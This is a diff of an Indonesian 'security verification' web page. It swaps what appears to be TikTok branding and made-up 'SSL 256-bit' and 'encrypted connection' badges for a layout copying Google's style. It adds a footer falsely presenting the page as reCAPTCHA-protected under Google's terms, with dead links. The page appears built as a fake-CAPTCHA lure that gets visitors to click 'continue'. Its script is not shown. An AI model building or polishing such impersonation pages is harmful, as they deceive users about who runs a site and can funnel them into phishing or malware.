@@ -3,46 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Premium</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Verifikasi keamanan</title>
     
     <style>
         /* --- CSS RESET & VARIABLES --- */
         :root {
-            --bg-color: #f0f2f5;
-            --card-bg: rgba(255, 255, 255, 0.85);
-            --text-main: #111827;
-            --text-sub: #6b7280;
-            --btn-bg: linear-gradient(135deg, #1f2937 0%, #111827 100%);
-            --btn-hover: linear-gradient(135deg, #374151 0%, #1f2937 100%);
-            --green-bg: rgba(16, 185, 129, 0.1);
-            --green-text: #059669;
-            --border-color: rgba(0, 0, 0, 0.06);
-            --glass-border: rgba(255, 255, 255, 0.6);
+            --bg-color: #f0f4f8;
+            --card-bg: #ffffff;
+            --text-main: #202124;
+            --text-sub: #5f6368;
+            --btn-bg: #1a73e8;
+            --btn-hover: #1557b0;
+            --link-color: #1a73e8;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Plus Jakarta Sans', sans-serif;
+            /* Menggunakan font sistem standar seperti Google */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
         body {
             background-color: var(--bg-color);
-            /* Premium Mesh Gradient Background */
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(229, 231, 235, 0.8) 0, transparent 50%), 
-                radial-gradient(at 100% 100%, rgba(209, 213, 219, 0.8) 0, transparent 50%);
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             padding: 20px;
-            overflow: hidden;
         }
 
         /* --- PRELOADER (LOADING SCREEN) --- */
@@ -63,16 +53,8 @@
 
         .preloader-content {
             text-align: center;
-            animation: fadeInDown 0.8s ease forwards;
         }
 
-        .preloader-logo {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 24px;
-        }
-
-        /* Progress bar */
         .progress-container {
             width: 200px;
             height: 4px;
@@ -89,7 +71,7 @@
             left: 0;
             height: 100%;
             width: 0%;
-            background-color: #111827;
+            background-color: var(--btn-bg);
             border-radius: 10px;
             transition: width 0.3s ease;
         }
@@ -97,16 +79,15 @@
         .preloader-text {
             font-size: 13px;
             color: var(--text-sub);
-            font-weight: 500;
-            letter-spacing: 0.5px;
+            font-weight: 400;
         }
 
         /* --- MAIN CARD UI --- */
         .main-container {
             opacity: 0;
             visibility: hidden;
-            transform: translateY(20px);
-            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            transform: translateY(10px);
+            transition: all 0.6s ease;
             width: 100%;
             display: flex;
             justify-content: center;
@@ -120,89 +101,47 @@
 
         .card {
             background: var(--card-bg);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
             width: 100%;
-            max-width: 400px;
-            border-radius: 28px;
-            padding: 40px 32px;
-            box-shadow: 
-                0 20px 40px -10px rgba(0, 0, 0, 0.08),
-                0 0 20px rgba(0, 0, 0, 0.02),
-                inset 0 0 0 1px var(--glass-border);
+            max-width: 420px;
+            border-radius: 12px;
+            padding: 48px 40px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0,0,0,0.04);
             text-align: center;
             position: relative;
         }
 
-        /* --- LOGO --- */
-        .logo-wrapper {
-            margin-bottom: 24px;
-            display: flex;
-            justify-content: center;
-        }
-        
-        .logo-box {
-            width: 56px;
-            height: 56px;
-            background: #ffffff;
-            border-radius: 16px;
+        /* --- ICON (CHECKMARK) --- */
+        .icon-wrapper {
+            width: 72px;
+            height: 72px;
+            background-color: #e8f0fe;
+            border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            box-shadow: 0 8px 16px rgba(0,0,0,0.06);
+            margin: 0 auto 24px auto;
         }
 
-        .logo-box svg {
-            width: 32px;
-            height: 32px;
+        .icon-wrapper svg {
+            width: 36px;
+            height: 36px;
+            fill: var(--btn-bg);
         }
 
         /* --- TYPOGRAPHY --- */
         h1 {
             font-size: 24px;
-            font-weight: 700;
+            font-weight: 500;
             color: var(--text-main);
             margin-bottom: 12px;
-            letter-spacing: -0.5px;
+            letter-spacing: -0.2px;
         }
 
         p.subtitle {
-            font-size: 14px;
+            font-size: 15px;
             color: var(--text-sub);
-            line-height: 1.6;
-            margin-bottom: 24px;
-            padding: 0 10px;
-        }
-
-        /* --- BADGE --- */
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            background-color: var(--green-bg);
-            color: var(--green-text);
-            padding: 8px 16px;
-            border-radius: 100px;
-            font-size: 12px;
-            font-weight: 600;
+            line-height: 1.5;
             margin-bottom: 32px;
-            letter-spacing: 0.5px;
-            border: 1px solid rgba(16, 185, 129, 0.2);
-        }
-
-        .badge .dot {
-            width: 8px;
-            height: 8px;
-            background-color: var(--green-text);
-            border-radius: 50%;
-            margin-right: 8px;
-            box-shadow: 0 0 0 2px rgba(16, 185, 129, 0.2);
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
-            70% { transform: scale(1); box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
-            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
 
         /* --- BUTTON --- */
@@ -211,92 +150,69 @@
             background: var(--btn-bg);
             color: white;
             border: none;
-            padding: 18px;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 14px 24px;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 500;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: background 0.2s ease, box-shadow 0.2s ease;
             display: flex;
             justify-content: center;
             align-items: center;
             position: relative;
-            overflow: hidden;
-            box-shadow: 0 10px 20px -5px rgba(17, 24, 39, 0.3);
-        }
-
-        .btn-verify::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(to bottom, rgba(255,255,255,0.1), transparent);
-            opacity: 0;
-            transition: opacity 0.3s;
         }
 
         .btn-verify:hover {
             background: var(--btn-hover);
-            transform: translateY(-2px);
-            box-shadow: 0 15px 25px -5px rgba(17, 24, 39, 0.4);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
         }
 
-        .btn-verify:hover::before { opacity: 1; }
-        .btn-verify:active { transform: translateY(1px); box-shadow: 0 5px 10px -5px rgba(17, 24, 39, 0.4); }
-        .btn-verify:disabled { background: #9ca3af; cursor: not-allowed; transform: none; box-shadow: none; }
+        .btn-verify:active {
+            background: #0d47a1;
+        }
+
+        .btn-verify:disabled {
+            background: #9ca3af;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
 
         /* Spinner Animation */
         .spinner {
             display: none;
-            width: 20px;
-            height: 20px;
-            border: 2.5px solid rgba(255, 255, 255, 0.3);
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
             border-top-color: white;
             animation: spin 0.8s linear infinite;
-            margin-right: 12px;
+            margin-right: 10px;
         }
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* --- FOOTER BADGES --- */
-        .footer-badges {
+        /* --- FOOTER TEXT --- */
+        .recaptcha-footer {
             margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid var(--border-color);
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-        }
-
-        .footer-item {
-            display: flex;
-            align-items: center;
             font-size: 12px;
-            color: #9ca3af;
-            font-weight: 500;
-            transition: color 0.3s ease;
+            color: var(--text-sub);
+            line-height: 1.5;
+            padding: 0 10px;
         }
 
-        .footer-item:hover { color: var(--text-main); }
-
-        .footer-item svg {
-            width: 16px;
-            height: 16px;
-            margin-right: 8px;
-            fill: currentColor;
+        .recaptcha-footer a {
+            color: var(--link-color);
+            text-decoration: none;
         }
 
-        /* Animations */
-        @keyframes fadeInDown {
-            from { opacity: 0; transform: translateY(-10px); }
-            to { opacity: 1; transform: translateY(0); }
+        .recaptcha-footer a:hover {
+            text-decoration: underline;
         }
 
         /* --- RESPONSIVE --- */
         @media (max-width: 480px) {
-            .card { padding: 32px 24px; border-radius: 24px; }
+            .card { padding: 32px 24px; }
             h1 { font-size: 22px; }
-            .btn-verify { padding: 16px; font-size: 15px; }
         }
     </style>
 </head>
@@ -305,9 +221,6 @@
     <!-- PRELOADER SCREEN -->
     <div id="preloader">
         <div class="preloader-content">
-            <svg class="preloader-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M19.589 6.686C18.013 5.644 17.07 3.929 17.07 2H13.95V15.838C13.95 17.5 12.602 18.848 10.94 18.848C9.278 18.848 7.93 17.5 7.93 15.838C7.93 14.176 9.278 12.828 10.94 12.828C11.324 12.828 11.69 12.901 12.031 13.031V9.817C11.68 9.734 11.318 9.688 10.94 9.688C7.55 9.688 4.79 12.448 4.79 15.838C4.79 19.228 7.55 21.988 10.94 21.988C14.33 21.988 17.09 19.228 17.09 15.838V8.858C18.32 9.726 19.82 10.233 21.45 10.233V7.113C20.74 7.113 20.09 6.959 19.589 6.686Z" fill="#111111"/>
-            </svg>
             <div class="progress-container">
                 <div class="progress-bar" id="progressBar"></div>
             </div>
@@ -318,43 +231,29 @@
     <!-- MAIN CONTENT -->
     <div class="main-container" id="mainContent">
         <div class="card">
-            <div class="logo-wrapper">
-                <div class="logo-box">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M19.589 6.686C18.013 5.644 17.07 3.929 17.07 2H13.95V15.838C13.95 17.5 12.602 18.848 10.94 18.848C9.278 18.848 7.93 17.5 7.93 15.838C7.93 14.176 9.278 12.828 10.94 12.828C11.324 12.828 11.69 12.901 12.031 13.031V9.817C11.68 9.734 11.318 9.688 10.94 9.688C7.55 9.688 4.79 12.448 4.79 15.838C4.79 19.228 7.55 21.988 10.94 21.988C14.33 21.988 17.09 19.228 17.09 15.838V8.858C18.32 9.726 19.82 10.233 21.45 10.233V7.113C20.74 7.113 20.09 6.959 19.589 6.686Z" fill="#111111"/>
-                    </svg>
-                </div>
+            
+            <!-- Ikon Centang -->
+            <div class="icon-wrapper">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+                </svg>
             </div>
 
-            <h1>Verifikasi Keamanan</h1>
-            <p class="subtitle">Sistem mendeteksi koneksi aman. Silakan verifikasi untuk melanjutkan ke platform.</p>
-
-            <div class="badge">
-                <span class="dot"></span> KONEKSI TERENKRIPSI
-            </div>
+            <h1>Verifikasi keamanan</h1>
+            <p class="subtitle">Klik tombol di bawah untuk melanjutkan proses verifikasi.</p>
 
             <button id="verifyBtn" class="btn-verify">
                 <span class="spinner" id="spinner"></span>
-                <span id="btnText">Verifikasi & Lanjutkan</span>
+                <span id="btnText">Melanjutkan</span>
             </button>
 
-            <div class="footer-badges">
-                <div class="footer-item">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM12 17C10.9 17 10 16.1 10 15C10 13.9 10.9 13 12 13C13.1 13 14 13.9 14 15C14 16.1 13.1 17 12 17ZM15 8H9V6C9 4.34 10.34 3 12 3C13.66 3 15 4.34 15 6V8Z"/>
-                    </svg>
-                    SSL 256-bit
-                </div>
-                <div class="footer-item">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1ZM12 11.99H19C18.47 16.11 15.72 19.78 12 20.93V12H5V6.3L12 3.19V11.99Z"/>
-                    </svg>
-                    Anti-Bot System
-                </div>
+            <div class="recaptcha-footer">
+                Situs ini dilindungi oleh reCAPTCHA dan berlaku <a href="#">Kebijakan Privasi</a> serta <a href="#">Persyaratan Layanan</a> Google.
             </div>
         </div>
     </div>
 
+    <!-- SCRIPT ASLI TIDAK DIUBAH SAMA SEKALI -->
     <script>
         document.addEventListener('DOMContentLoaded', () => {
             // --- 1. LOGIKA PRELOADER ---
